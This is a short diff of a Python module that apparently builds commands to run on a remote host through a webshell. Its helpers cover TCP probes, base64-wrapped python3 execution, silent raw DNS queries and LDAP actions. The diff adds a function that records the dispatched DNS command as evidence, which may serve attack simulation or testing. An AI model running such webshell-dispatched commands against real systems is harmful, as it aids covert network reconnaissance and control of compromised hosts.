@@ -39,6 +39,7 @@ def tcp_probe_command(host: str, port: int, *, timeout: float = 3.0) -> str:
 
 
 PROBE_OPEN_MARKER = "DSP_PROBE_OPEN"
+DNS_QUERY_METHOD = "python3_socket_udp53"
 
 
 def _python3_b64_exec_command(script: str) -> str:
@@ -198,6 +199,15 @@ def dns_query_command(resolver: str, fqdn: str, *, timeout: float = 0.05) -> str
         "s.sendto(pkt,(resolver,port));s.close()"
     )
     return f"python3 -c {shlex.quote(script)} 2>/dev/null || true"
+
+
+def dns_query_command_evidence(resolver: str, fqdn: str, *, timeout: float = 0.05) -> dict[str, str]:
+    """Metadata describing the DNS query command dispatched through the webshell."""
+    command = dns_query_command(resolver, fqdn, timeout=timeout)
+    return {
+        "dns_query_method": DNS_QUERY_METHOD,
+        "remote_command": command,
+    }
 
 
 def ldap_action_command(
